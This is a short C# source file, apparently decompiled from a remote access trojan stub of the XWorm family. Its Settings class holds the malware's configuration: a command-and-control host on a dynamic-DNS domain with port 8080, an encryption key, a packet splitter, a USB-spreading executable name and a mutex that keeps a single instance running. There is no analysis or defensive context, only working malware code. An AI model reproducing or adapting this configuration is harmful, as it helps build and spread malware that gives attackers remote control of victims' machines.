using System.Diagnostics;
using System.Threading;

namespace Stub;

public class Settings
{
	public static string Host = "liouas.ddns.net";

	public static string Port = "8080";

	public static string KEY = "<123456789>";

	public static string SPL = "<Xwormmm>";

	public static string USBNM = "USB.exe";

	public static readonly string Mutexx = "TU5fle8k2nXRhnpV";

	public static Mutex _appMutex;

	public static bool usbC;

	public static string current = Process.GetCurrentProcess().MainModule!.FileName;
}
